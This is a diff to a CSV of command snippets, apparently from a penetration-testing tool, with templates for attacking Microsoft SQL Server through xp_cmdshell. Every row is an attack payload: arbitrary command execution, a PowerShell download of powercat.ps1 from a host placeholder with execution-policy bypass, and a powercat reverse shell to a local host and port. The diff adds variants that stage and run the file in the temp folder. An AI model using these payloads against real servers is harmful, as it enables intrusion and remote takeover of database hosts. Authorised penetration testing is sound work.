@@ -1,4 +1,6 @@
 name,description,snippet,variables
 MsSQLExecuteCommand,MsSQL comamnd execution via xp_cmdshell,EXEC xp_cmdshell "§§§command§§§",§§§command§whoami§command that should be executed§§§
 MsSQLExecuteCommandPsDownload,MsSQL comamnd execution via xp_cmdshell (download file via powershell),EXEC xp_cmdshell "powershell -ep bypass -nop iwr -uri ###HttpUri###§§§file§§§ -outfile §§§file§§§",§§§file§powercat.ps1§filename to download from host§§§
+MsSQLExecuteCommandPsDownloadTemp,MsSQL comamnd execution via xp_cmdshell (download file via powershell to temp),EXEC xp_cmdshell "powershell -ep bypass -nop iwr -uri ###HttpUri###§§§file§§§ -outfile $env:TEMP\§§§file§§§",§§§file§powercat.ps1§filename to download from host§§§
 MsSQLExecutePowercat,MsSQL comamnd execution via xp_cmdshell (powercat connection to host),EXEC xp_cmdshell "powershell -ep bypass -nop . powercat.ps1; powercat -c ###LocalHost### -p ###LocalPort### -ep",
+MsSQLExecutePowercatTemp,MsSQL comamnd execution via xp_cmdshell (powercat connection to host in temp),EXEC xp_cmdshell "powershell -ep bypass -nop . $env:TEMP\powercat.ps1; powercat -c ###LocalHost### -p ###LocalPort### -ep",
